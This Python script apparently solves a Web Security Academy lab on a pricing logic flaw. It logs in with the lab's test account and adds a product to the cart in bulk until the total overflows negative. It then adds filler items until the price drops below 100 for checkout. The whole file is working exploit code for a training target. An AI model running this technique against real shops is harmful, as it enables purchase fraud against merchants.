import http.client
import re
import ssl
import urllib.parse

LAB_ID = '???'


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_cart(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/cart'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/cart',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_cart(
        session: str,
        product_id: str,
        quantity: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/cart'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate, br',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/product?productId=1',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'productId': product_id,
        'redir': 'PRODUCT',
        'quantity': quantity,
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_csrf() -> tuple[str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


def cart_total_and_csrf(session: str) -> tuple[float, str]:
    response = GET_cart(session)
    response_body = response.read().decode('utf-8')
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response_body)[0]
    total = re.findall(r'<th>(-?\$-?[0-9]+\.[0-9]+)</th>', response_body)[0]
    return float(total.replace('$', '')), csrf


def login_session() -> str:
    session, csrf = login_csrf()
    response = POST_login(session, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


l33t_jacket_id = '1'
filler_product_id = '2'
filler_quantity = '99'
session = login_session()
print(f'logged in. session: {session}')
POST_cart(session, l33t_jacket_id, filler_quantity)
print('added l33t jacket to cart')
total, csrf = cart_total_and_csrf(session)
while abs(total) > 130000:
    print(f'total price: {total}')
    POST_cart(session, l33t_jacket_id, filler_quantity)
    print(f'added {filler_quantity} l33t jackets')
    total, csrf = cart_total_and_csrf(session)
while abs(total) > 1300:
    print(f'total price: {total}')
    POST_cart(session, l33t_jacket_id, '1')
    print(f'added 1 l33t jacket')
    total, csrf = cart_total_and_csrf(session)
while not (0 < total < 100):
    print(f'total price: {total}')
    POST_cart(session, filler_product_id, '1')
    print(f'added 1 filler product')
    total, csrf = cart_total_and_csrf(session)
print(f'total price: {total}')
print('ready to check out in the web browser')
